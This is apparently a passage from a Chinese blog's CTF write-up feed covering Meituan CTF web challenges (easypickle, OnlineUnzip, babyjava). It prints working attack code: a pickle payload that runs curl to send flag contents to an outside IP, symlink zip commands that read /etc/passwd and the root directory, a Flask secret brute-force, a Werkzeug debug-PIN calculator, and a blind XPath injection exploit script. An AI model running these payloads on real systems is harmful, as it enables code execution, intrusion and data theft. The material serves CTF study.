&quot;&#39;&gt;&quot; + i + &quot;&lt;&#x2F;a&gt;&lt;br&gt;&quot;                x &#x3D; x.replace(&quot;HTMLTEXT&quot;, ret)                return x@app.route(&#39;&#x2F;upload&#39;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])def upload():    ip &#x3D; request.remote_addr    uploadpath &#x3D; &#39;uploads&#x2F;&#39; + md5(ip.encode()).hexdigest()[0:4]    if not os.path.exists(uploadpath):        os.makedirs(uploadpath)    if request.method &#x3D;&#x3D; &#39;GET&#39;:        return redirect(&#39;&#x2F;&#39;)    if request.method &#x3D;&#x3D; &#39;POST&#39;:        try:            upFile &#x3D; request.files[&#39;file&#39;]            print(upFile.filename)            if os.path.splitext(upFile.filename)[-1]&#x3D;&#x3D;&#39;.zip&#39;:                filepath&#x3D;f&quot;&#123;uploadpath&#125;&#x2F;&#123;md5(upFile.filename.encode()).hexdigest()[0:4]&#125;.zip&quot;                upFile.save(filepath)                zipDatas &#x3D; extractFile(filepath)                return zipDatas            else:                return f&quot;&#123;upFile.filename&#125; is not a zip file !&quot;        except:            return make_response(&quot;error&quot;, 404)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;8000, debug&#x3D;True)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>在线解压平台</strong>，功能是上传一个压缩包，服务器会自动解压然后将压缩包中的文件展示在服务器上</p><p>一般都是使用Linux软连接进行任意文件读取</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-s</span> / a <span class="token comment">#生成指向根目录的软连接</span><span class="token function">ln</span> <span class="token parameter variable">-s</span> <span class="token variable">$1</span> a <span class="token comment">#$1表示根目录</span><span class="token function">ln</span> <span class="token parameter variable">-s</span> /etc/passwd a <span class="token comment">#生成执行/etc/passwd文件的软连接</span><span class="token function">zip</span> <span class="token parameter variable">-y</span> hack.zip a <span class="token comment">#将软连接加入压缩包 使用-y参数以保证打包的是一个软链接文件</span><span class="token function">zip</span> <span class="token parameter variable">--symlinks</span> hack.zip a <span class="token comment">#将软连接加入压缩包 使用-y参数以保证打包的是一个软链接文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-1663427877221.png" alt="img"></p><p>也可以直接读取更目录，然后就可以读取全部文件了（除了权限限制）</p><p><img src="/images/image-20220917232343939.png" alt="image-20220917232343939"></p><p><img src="/images/image-20220917232637291.png" alt="image-20220917232637291"></p><p>对于php</p><p>我们也发现 file_get_contents 可以处理Linux软连接</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1.txt.lnk'</span><span class="token punctuation">)</span> <span class="token comment">#可以成功打开1.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTFWEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>美团CTF</title>
      <link href="/2022/09/17/mei-tuan-ctf/"/>
      <url>/2022/09/17/mei-tuan-ctf/</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easypickle"><a href="#easypickle" class="headerlink" title="easypickle"></a>easypickle</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python"> import base64import picklefrom flask import Flask, sessionimport osimport randomapp &#x3D; Flask(__name__)app.config[&#39;SECRET_KEY&#39;] &#x3D; os.urandom(2).hex()@app.route(&#39;&#x2F;&#39;)def hello_world():    if not session.get(&#39;user&#39;):        session[&#39;user&#39;] &#x3D; &#39;&#39;.join(random.choices(&quot;admin&quot;, k&#x3D;5))    return &#39;Hello &#123;&#125;!&#39;.format(session[&#39;user&#39;])@app.route(&#39;&#x2F;admin&#39;)def admin():    if session.get(&#39;user&#39;) !&#x3D; &quot;admin&quot;:        return f&quot;&lt;script&gt;alert(&#39;Access Denied&#39;);window.location.href&#x3D;&#39;&#x2F;&#39;&lt;&#x2F;script&gt;&quot;    else:        try:            a &#x3D; base64.b64decode(session.get(&#39;ser_data&#39;)).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;)            if b&#39;R&#39; in a or b&#39;i&#39; in a or b&#39;o&#39; in a or b&#39;b&#39; in a:                raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;)            pickle.loads(base64.b64decode(session.get(&#39;ser_data&#39;)))            return &quot;ok&quot;        except:            return &quot;error!&quot;if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;8888)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><p><a href="https://github.com/Paradoxis/Flask-Unsign">https://github.com/Paradoxis/Flask-Unsign</a></p><p>爆破字典</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span><span class="token operator">=</span><span class="token string">"1234567890abcdef"</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"wordList.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> p <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>                    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token operator">+</span>j<span class="token operator">+</span>k<span class="token operator">+</span>p<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>暂时无法在飞书文档外展示此内容</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">flask-unsign -u --no-literal-eval --wordlist wordList.txt --server &quot;http:&#x2F;&#x2F;eci-2zeii0wm9qa59wmfsm56.cloudeci1.ichunqiu.com:8888&#x2F;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/image-1663427877278.png" alt="img"></p><p><a href="https://its203.com/article/weixin_45751765/125874045%EF%BC%88%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0">https://its203.com/article/weixin_45751765/125874045（这篇文章</a></p><p><a href="http://h0cksr.xyz/archives/709">http://h0cksr.xyz/archives/709</a></p><p><a href="https://ek1ng.com/LMCTF2022.html">https://ek1ng.com/LMCTF2022.html</a></p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import base64opcode &#x3D; b&#39;&#39;&#39;c__builtin__mapp00(S&#39;curl http:&#x2F;&#x2F;175.178.47.228:9999&#x2F;?q&#x3D;&#96;cat f*&#96;&#39;tp10(cossystemg1tp20g0g2\x81p30c__builtin__bytesp4(g3t\x81.&#39;&#39;&#39;print(base64.b64encode(opcode))python3 flask_session_cookie_manager3.py encode -s &quot;d0c0&quot; -t &quot; &#123;&#39;user&#39;:&#39;admin&#39;,&#39;ser_data&#39;:&#39;Y19fYnVpbHRpbl9fCm1hcApwMAowKFMnY3VybCBodHRwOi8vMTc1LjE3OC40Ny4yMjg6OTk5OS8&#x2F;cT1gY2F0IGYqYCcKdHAxCjAoY29zCnN5c3RlbQpnMQp0cDIKMGcwCmcyCoFwMwowY19fYnVpbHRpbl9fCmJ5dGVzCnA0CihnMwp0gS4&#x3D;&#39;&#125;&quot;#.eJxljk8LgjAcQL_LzkEzNTLosH6lli3JRNgpdCvTclt_l0XfPe8d34MH74Met_0VjVEumkqiHupoJ_J73ilmeQcmM12EiS7O3gEa68iJNpQoE_lUMjtrC5gqESYmrkZPmnJrVc_tGBy8bp2W1uUwTk9uvB31eWqVbODjRcAuDHgkQvKCmig28N4g1y63k3Ox0ZJuNOazRUQDbqDhLSjfUKPM_8vSFUHWtQRDdZTUaFxunQn6_gClqEXV.YyWciA.SOj6_bh5ALAzc5CI4eSADdKhylI(<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-1663427877242.png" alt="img"></p><h3 id="OnlineUnzip"><a href="#OnlineUnzip" class="headerlink" title="OnlineUnzip"></a>OnlineUnzip</h3><p>app.py</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import osimport refrom hashlib import md5from flask import Flask, redirect, request, render_template, url_for, make_responseapp&#x3D;Flask(__name__)def extractFile(filepath):    extractdir&#x3D;filepath.split(&#39;.&#39;)[0]    if not os.path.exists(extractdir):        os.makedirs(extractdir)    os.system(f&#39;unzip -o &#123;filepath&#125; -d &#123;extractdir&#125;&#39;)    return redirect(url_for(&#39;display&#39;,extractdir&#x3D;extractdir))@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;])def index():    return render_template(&#39;index.html&#39;)@app.route(&#39;&#x2F;display&#39;, methods&#x3D;[&#39;GET&#39;])@app.route(&#39;&#x2F;display&#x2F;&#39;, methods&#x3D;[&#39;GET&#39;])@app.route(&#39;&#x2F;display&#x2F;&lt;path:extractdir&gt;&#39;, methods&#x3D;[&#39;GET&#39;])def display(extractdir&#x3D;&#39;&#39;):    if re.search(r&quot;\.\.&quot;, extractdir, re.M | re.I) !&#x3D; None:        return &quot;Hacker?&quot;    else:        if not os.path.exists(extractdir):            return make_response(&quot;error&quot;, 404)        else:            if not os.path.isdir(extractdir):                f &#x3D; open(extractdir, &#39;rb&#39;)                response &#x3D; make_response(f.read())                response.headers[&#39;Content-Type&#39;] &#x3D; &#39;application&#x2F;octet-stream&#39;                return response            else:                fn &#x3D; os.listdir(extractdir)                fn &#x3D; [&quot;..&quot;] + fn                f &#x3D; open(&quot;templates&#x2F;template.html&quot;)                x &#x3D; f.read()                f.close()                ret &#x3D; &quot;&lt;h1&gt;文件列表:&lt;&#x2F;h1&gt;&lt;br&gt;&lt;hr&gt;&quot;                for i in fn:                    tpath &#x3D; os.path.join(&#39;&#x2F;display&#39;, extractdir, i)                    ret +&#x3D; &quot;&lt;a href&#x3D;&#39;&quot; + tpath + &quot;&#39;&gt;&quot; + i + &quot;&lt;&#x2F;a&gt;&lt;br&gt;&quot;                x &#x3D; x.replace(&quot;HTMLTEXT&quot;, ret)                return x@app.route(&#39;&#x2F;upload&#39;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])def upload():    ip &#x3D; request.remote_addr    uploadpath &#x3D; &#39;uploads&#x2F;&#39; + md5(ip.encode()).hexdigest()[0:4]    if not os.path.exists(uploadpath):        os.makedirs(uploadpath)    if request.method &#x3D;&#x3D; &#39;GET&#39;:        return redirect(&#39;&#x2F;&#39;)    if request.method &#x3D;&#x3D; &#39;POST&#39;:        try:            upFile &#x3D; request.files[&#39;file&#39;]            print(upFile.filename)            if os.path.splitext(upFile.filename)[-1]&#x3D;&#x3D;&#39;.zip&#39;:                filepath&#x3D;f&quot;&#123;uploadpath&#125;&#x2F;&#123;md5(upFile.filename.encode()).hexdigest()[0:4]&#125;.zip&quot;                upFile.save(filepath)                zipDatas &#x3D; extractFile(filepath)                return zipDatas            else:                return f&quot;&#123;upFile.filename&#125; is not a zip file !&quot;        except:            return make_response(&quot;error&quot;, 404)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.run(host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;8000, debug&#x3D;True)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>在线解压平台</strong>，一般都是使用Linux软连接进行任意文件读取</p><p><img src="/images/image-1663427877221.png" alt="img"></p><p>也可以直接读取更目录，然后就可以读取全部文件了（除了权限限制）</p><p><img src="/images/image-20220917232343939.png" alt="image-20220917232343939"></p><p><img src="/images/image-20220917232637291.png" alt="image-20220917232637291"></p><p><img src="/images/image-1663427877277.png" alt="img"></p><pre class="line-numbers language-Plain" data-language="Plain"><code class="language-Plain">六要素username ctfmodname flask.appappname Flaskmoddir &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py #点击ffffl111l1a44a4ggg报错得到uuidnode 00:16:3e:10:91:93 &#x3D;&gt;95530553747machine_id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;etc&#x2F;passwd</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bashdaemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologinbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologinsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;syncgames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologinman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologinlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologinmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologinnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologinuucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologinproxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinwww-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologinbackup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologinlist:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologinirc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologingnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologinnobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologinctf:x:1000:1000::&#x2F;home&#x2F;ctf:&#x2F;bin&#x2F;sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p><p><img src="/images/image-1663427877221.png" alt="img"></p><pre class="line-numbers language-Plain" data-language="Plain"><code class="language-Plain">00:16:3e:30:f0:4c&#x3D;&gt;95532675148<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>&#x2F;etc&#x2F;machine-id</p><pre class="line-numbers language-Plain" data-language="Plain"><code class="language-Plain">96cec10d3d9307792745ec3b85c89620<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id</p><pre class="line-numbers language-Plain" data-language="Plain"><code class="language-Plain">8c1be6d0-0ed4-4bac-902a-57f6d257d4ce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>&#x2F;proc&#x2F;self&#x2F;cgroup</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">11:name&#x3D;systemd:&#x2F;kubepods&#x2F;podeci-2zegwb2qirhajewrc93c&#x2F;217dec881f44ce52b32dd2d656844472f15b409abb06b1dac6227c019bc98ee710:devices:&#x2F;kubepods&#x2F;podeci-2zegwb2qirhajewrc93c&#x2F;217dec881f44ce52b32dd2d656844472f15b409abb06b1dac6227c019bc98ee79:blkio:&#x2F;kubepods&#x2F;podeci-2zegwb2qirhajewrc93c&#x2F;217dec881f44ce52b32dd2d656844472f15b409abb06b1dac6227c019bc98ee78:net_cls,net_prio:&#x2F;kubepods&#x2F;podeci-2zegwb2qirhajewrc93c&#x2F;217dec881f44ce52b32dd2d656844472f15b409abb06b1dac6227c019bc98ee77:perf_event:&#x2F;kubepods&#x2F;podeci-2zegwb2qirhajewrc93c&#x2F;217dec881f44ce52b32dd2d656844472f15b409abb06b1dac6227c019bc98ee76:cpuset:&#x2F;kubepods&#x2F;podeci-2zegwb2qirhajewrc93c&#x2F;217dec881f44ce52b32dd2d656844472f15b409abb06b1dac6227c019bc98ee75:memory:&#x2F;kubepods&#x2F;podeci-2zegwb2qirhajewrc93c&#x2F;217dec881f44ce52b32dd2d656844472f15b409abb06b1dac6227c019bc98ee74:cpu,cpuacct:&#x2F;kubepods&#x2F;podeci-2zegwb2qirhajewrc93c&#x2F;217dec881f44ce52b32dd2d656844472f15b409abb06b1dac6227c019bc98ee73:hugetlb:&#x2F;kubepods&#x2F;podeci-2zegwb2qirhajewrc93c&#x2F;217dec881f44ce52b32dd2d656844472f15b409abb06b1dac6227c019bc98ee72:freezer:&#x2F;kubepods&#x2F;podeci-2zegwb2qirhajewrc93c&#x2F;217dec881f44ce52b32dd2d656844472f15b409abb06b1dac6227c019bc98ee71:pids:&#x2F;kubepods&#x2F;podeci-2zegwb2qirhajewrc93c&#x2F;217dec881f44ce52b32dd2d656844472f15b409abb06b1dac6227c019bc98ee70::&#x2F;#读任意根目录ln -s &#x2F; .azip --symlinks root.zip .aimport hashlibfrom itertools import chainprobably_public_bits &#x3D; [    &#39;ctf&#39;# &#x2F;etc&#x2F;passwd    &#39;flask.app&#39;,# 默认值    &#39;Flask&#39;,# 默认值    &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39; # 报错得到]private_bits &#x3D; [    &#39;95532807882&#39;,#  &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address    &#39;96cec10d3d9307792745ec3b85c8962019b065577048ffd94233375ed305835825f08ca636839a3cf042ee07df0ef676&#39;                     # &#x2F;etc&#x2F;machine-id+&#x2F;proc&#x2F;self&#x2F;cgroup ]h &#x3D; hashlib.sha1()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit &#x3D; bit.encode(&#39;utf-8&#39;)    h.update(bit)h.update(b&#39;cookiesalt&#39;)cookie_name &#x3D; &#39;__wzd&#39; + h.hexdigest()[:20]num &#x3D; Noneif num is None:    h.update(b&#39;pinsalt&#39;)    num &#x3D; (&#39;%09d&#39; % int(h.hexdigest(), 16))[:9]rv &#x3D;Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size &#x3D;&#x3D; 0:            rv &#x3D; &#39;-&#39;.join(num[x:x + group_size].rjust(group_size, &#39;0&#39;)                          for x in range(0, len(num), group_size))            break    else:        rv &#x3D; numprint(rv)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-1663427877273.png" alt="img"></p><h3 id="babyjava"><a href="#babyjava" class="headerlink" title="babyjava"></a>babyjava</h3><p>参考：<a href="https://xz.aliyun.com/t/7791?page=1#toc-3">https://xz.aliyun.com/t/7791?page=1#toc-3</a></p><pre class="line-numbers language-Go" data-language="Go"><code class="language-Go">root  1 len:4 user     2 len:8 username        len:8 username<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>exp.py</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">import stringimport requestsurl&#x3D;&quot;http:&#x2F;&#x2F;eci-2zegwb2qirhal23opwv4.cloudeci1.ichunqiu.com:8888&#x2F;hello&quot;def send(payload):    data&#x3D;&#123;        &#39;xpath&#39;:payload    &#125;    return requests.post(url&#x3D;url,data&#x3D;data)def getRootCnt():    for i in range(10):        payload&#x3D;f&quot;&#39;or count(&#x2F;)&#x3D;&#123;i&#125;  and &#39;&#39;&#x3D;&#39;&quot;        r&#x3D;send(payload)        if &#39;&lt;p&gt;user1&lt;&#x2F;p&gt;&#39; in r.text:            print(&#39;getRootCnt&#39;+&#39;: &#39;+str(i))            breakdef getSecondCnt():    for i in range(10):        payload&#x3D;f&quot;&#39;or count(&#x2F;*)&#x3D;&#123;i&#125; and &#39;&#39;&#x3D;&#39;&quot;        r&#x3D;send(payload)        if &#39;&lt;p&gt;user1&lt;&#x2F;p&gt;&#39; in r.text:            print(&#39;getSecondCnt&#39;+&#39;: &#39;+str(i))            breakdef getRootnameLen():    for i in range(10):        payload &#x3D; f&quot;&#39;or string-length(name(&#x2F;*[1]))&#x3D;&#123;i&#125; and &#39;&#39;&#x3D;&#39;&quot;        r &#x3D; send(payload)        if &#39;&lt;p&gt;user1&lt;&#x2F;p&gt;&#39; in r.text:            print(&#39;getRootnameLen&#39; + &#39;: &#39; + str(i))            breakdef getRootname():    res&#x3D;&#39;&#39;    for i in range(5):        for char in string.printable:            payload &#x3D; f&quot;&#39;or substring(name(&#x2F;*[1]), &#123;i&#125;, 1)&#x3D;&#39;&#123;char&#125;&#39;  and &#39;&#39;&#x3D;&#39;&quot;            r &#x3D; send(payload)            if &#39;&lt;p&gt;user1&lt;&#x2F;p&gt;&#39; in r.text:                res+&#x3D;char                # print(res)                break    print(&#39;getRootname: &#39;+res)def getSecondCnt():    for i in range(10):        payload&#x3D;f&quot;&#39;or count(&#x2F;root)&#x3D;&#123;i&#125;  and &#39;&#39;&#x3D;&#39;&quot;        r&#x3D;send(payload)        if &#39;&lt;p&gt;user1&lt;&#x2F;p&gt;&#39; in r.text:            print(&#39;getSecondCnt&#39;+&#39;: &#39;+str(i))            breakdef getSecondLen():    for i in range(10):        payload&#x3D;f&quot;&#39;or string-length(name(&#x2F;root&#x2F;*[1]))&#x3D;&#123;i&#125;  and &#39;&#39;&#x3D;&#39;&quot;        r&#x3D;send(payload)        if &#39;&lt;p&gt;user1&lt;&#x2F;p&gt;&#39; in r.text:            print(&#39;getSecondLen&#39;+&#39;: &#39;+str(i))            breakdef getSecondname():    res&#x3D;&#39;&#39;    for i in range(5):        for char in string.printable:            payload &#x3D; f&quot;&#39;or substring(name(&#x2F;root&#x2F;*[1]), &#123;i&#125;, 1)&#x3D;&#39;&#123;char&#125;&#39;  and &#39;&#39;&#x3D;&#39;&quot;            r &#x3D; send(payload)            if &#39;&lt;p&gt;user1&lt;&#x2F;p&gt;&#39; in r.text:                res+&#x3D;char                # print(res)                break    print(&#39;getSecondname: &#39;+res)def getThirdCnt():    for i in range(10):        payload&#x3D;f&quot;&#39;or count(&#x2F;root&#x2F;user&#x2F;*)&#x3D;&#123;i&#125; and &#39;&#39;&#x3D;&#39;&quot;        r&#x3D;send(payload)        if &#39;&lt;p&gt;user1&lt;&#x2F;p&gt;&#39; in r.text:            print(&#39;getRootCnt&#39;+&#39;: &#39;+str(i))            breakdef getThirdLen1():    for i in range(10):        payload&#x3D;f&quot;&#39;or string-length(name(&#x2F;root&#x2F;user[position()&#x3D;1]&#x2F;*[1]))&#x3D;&#123;i&#125; and &#39;&#39;&#x3D;&#39;&quot;        r&#x3D;send(payload)        if &#39;&lt;p&gt;user1&lt;&#x2F;p&gt;&#39; in r.text:            print(&#39;getThirdLen1&#39;+&#39;: &#39;+str(i))            breakdef getThirdLen2():    for i in range(10):        payload&#x3D;f&quot;&#39;or string-length(name(&#x2F;root&#x2F;user[position()&#x3D;1]&#x2F;*[2]))&#x3D;&#123;i&#125; and &#39;&#39;&#x3D;&#39;&quot;        r&#x3D;send(payload)        if &#39;&lt;p&gt;user1&lt;&#x2F;p&gt;&#39; in r.text:            print(&#39;getThirdLen2&#39;+&#39;: &#39;+str(i))            breakdef getThirdname1():    res&#x3D;&#39;&#39;    for i in range(5):        for char in string.printable:            payload &#x3D; f&quot;&#39;or substring(name(&#x2F;root&#x2F;user[position()&#x3D;1]&#x2F;*[1]), &#123;i&#125;, 1)&#x3D;&#39;&#123;char&#125;&#39;  and &#39;&#39;&#x3D;&#39;&quot;            r &#x3D; send(payload)            if &#39;&lt;p&gt;user1&lt;&#x2F;p&gt;&#39; in r.text:                res+&#x3D;char                print(res)                break    print(&#39;getThirdname1: &#39;+res)def getThirdname2():    res&#x3D;&#39;&#39;    for i in range(5):        for char in string.printable:            payload &#x3D; f&quot;&#39;or substring(name(&#x2F;root&#x2F;user[position()&#x3D;1]&#x2F;*[1]), &#123;i&#125;, 1)&#x3D;&#39;&#123;char&#125;&#39;  and &#39;&#39;&#x3D;&#39;&quot;            r &#x3D; send(payload)            if &#39;&lt;p&gt;user1&lt;&#x2F;p&gt;&#39; in r.text:                res+&#x3D;char                print(res)                break    print(&#39;getThirdname2: &#39;+res)def getflagLen():#flag在第二个username中    for i in range(100):        payload&#x3D;f&quot;&#39;or string-length((&#x2F;&#x2F;user[position()&#x3D;1]&#x2F;username[position()&#x3D;2]))&#x3D;&#123;i&#125;  and &#39;&#39;&#x3D;&#39;&quot;        r&#x3D;send(payload)        if &#39;&lt;p&gt;user1&lt;&#x2F;p&gt;&#39; in r.text:            print(&#39;getflagLen&#39;+&#39;: &#39;+str(i))            breakdef getFlag():    res&#x3D;&#39;&#39;    for i in range(43):        for char in string.printable:            payload &#x3D; f&quot;&#39;or substring((&#x2F;&#x2F;user[position()&#x3D;1]&#x2F;username[position()&#x3D;2]),&#123;i&#125;,1)&#x3D;&#39;&#123;char&#125;&#39;  and &#39;&#39;&#x3D;&#39;&quot;            r &#x3D; send(payload)            if &#39;&lt;p&gt;user1&lt;&#x2F;p&gt;&#39; in r.text:                res+&#x3D;char                print(res)                break    print(&#39;getFlag: &#39;+res)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    # getRootCnt()    # getRootnameLen()    # getRootname()    # getSecondCnt()    # getSecondLen()    # getSecondname()    # getThirdCnt() #2    # getThirdLen1()    # getThirdLen2()    # getThirdname1()    # getThirdname2()    # getflagLen()#42    getFlag()    #flag&#123;bddbcd1a-0ec4-4735-964a-adb40aa6228f&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></s